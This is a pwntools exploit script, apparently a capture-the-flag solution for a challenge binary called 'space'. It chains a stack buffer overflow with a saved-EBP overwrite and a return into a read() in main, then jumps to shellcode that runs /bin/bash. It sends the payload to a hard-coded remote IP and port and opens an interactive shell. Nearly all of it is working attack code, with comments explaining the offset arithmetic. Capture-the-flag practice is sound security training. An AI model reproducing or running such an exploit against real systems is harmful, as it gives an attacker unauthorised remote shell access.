#!/bin/python3

from pwn import *
import sys

IP = "209.97.129.156"
PORT = 31348

read_main_addr = 0x08049217
ebp_vuln_addr = 0x804b827

# this return will jump to the buffer declared in main
# since the EBP reconstructs to the beginning of the stack when returning to main
# and read()'s write to ebp-0x27
# we can say that the return address will be
# [ebp-0x27] (buffer in main) 
# + 0x12 (padding) 
# + 0x4 (the address to return in the payload) 
# = beggining of shellcode!!
second_ret_addr = ebp_vuln_addr - 0x27 + 0x12 + 0x4

print(str(hex(second_ret_addr)))
payload = b"A" * 14
payload += p32(ebp_vuln_addr)
payload += p32(read_main_addr)
# 31 - len (to fill the initial buffer to 31) ; 18 the new padding for the second run
payload += b"A" * (31 - len(payload) + 18) 
payload += p32(second_ret_addr)
payload += asm(shellcraft.execve("/bin/bash"))

#shell = process("./space")

shell = remote(IP, PORT)

shell.sendlineafter("> ", payload)

shell.interactive()



